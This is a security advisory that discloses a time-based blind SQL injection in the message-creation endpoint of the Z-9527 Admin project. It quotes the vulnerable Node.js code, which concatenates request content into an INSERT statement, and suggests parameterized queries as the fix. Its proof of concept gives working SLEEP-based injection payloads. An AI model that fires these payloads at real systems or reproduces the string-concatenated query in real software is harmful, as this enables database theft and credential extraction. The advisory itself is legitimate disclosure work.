# SQL Blind Injection Vulnerability in Z-9527 Admin

> **Software and Affected Version:** [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d

## Vulnerability files

-   `server/routes/message.js`
-   `server/controller/message.js`

## Description

A SQL blind injection vulnerability exists in [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d at the `/message/create` endpoint, where the `content` field in the request body is concatenated directly into a SQL statement without sanitization or parameterization. As a result, authenticated attackers can inject malicious SQL payloads using time-based blind-injection techniques to infer sensitive database information character-by-character through response-time analysis. This enables complete database enumeration, credential extraction, and potential privilege escalation. Mitigations include immediately replacing string concatenation with parameterized queries or prepared statements, implementing strict input validation and sanitization for all user-supplied parameters, applying the principle of least privilege to database connections, deploying web application firewalls with SQL injection detection rules, and conducting comprehensive security audits of all database query construction patterns across the codebase.

## Code Analysis

In `server/routes/message.js`:

```js
router.post('/create', async function (ctx, next) {
    const sessionId = ctx.cookies.get('sessionId');
    const res = await createMessage(ctx.request.body, sessionId);
    handleRes(ctx, next, res);
});
```

In `server/controller/message.js`:

```js
const createMessage = async (param, sessionId) => {
    const loginName = jwt.verify(sessionId, TOKEN_SECRETKEY).username;
    const userRes = await getUser({ username: loginName });
    const user = userRes.data || {};

    let insertObj = {
        type: param.type || 0,
        pid: param.pid || -1,
        createTime: Date.now(),
        content: `'${param.content}'` || '',
        userId: user.id,
        userIsAdmin: user.isAdmin,
        userName: `'${user.username}'`,
        userAvatar: `'${user.avatar}'`
    };
    if (param.type === 1) {
        const targetUserRes = await getUser({ id: param.targetUserId });
        const targetUser = targetUserRes.data || {};
        insertObj = {
            ...insertObj,
            targetUserId: targetUser.id,
            targetUserIsAdmin: targetUser.isAdmin,
            targetUserName: `'${targetUser.username}'`,
            targetUserAvatar: `'${targetUser.avatar}'`
        };
    }
    const sql = `insert into messages (${Object.keys(insertObj).join(',')}) values (${Object.values(insertObj).join(
        ','
    )})`;
    const res = await exec(sql);
    if (res.affectedRows) {
        return new SuccessModel({
            data: {
                id: res.insertId
            },
            message: '新增成功'
        });
    } else {
        return new ErrorModel({
            message: '新增失败'
        });
    }
};
```

The user input is directly concatenated into the SQL statement.

## Proof of Concept

Assuming the current database is `admin`, sending the following payload to `/message/create` returned a response after approximately 1014 ms:

```json
{ "content": "1' and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'a', SLEEP(1), 1) or '" }
```

![](./assets/sqli-1.png)

Assuming the current database is `admin`, sending the following payload to `/message/create` returned a response after approximately 8 ms:

```json
{ "content": "1' and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'b', SLEEP(1), 1) or '" }
```

![](./assets/sqli-2.png)
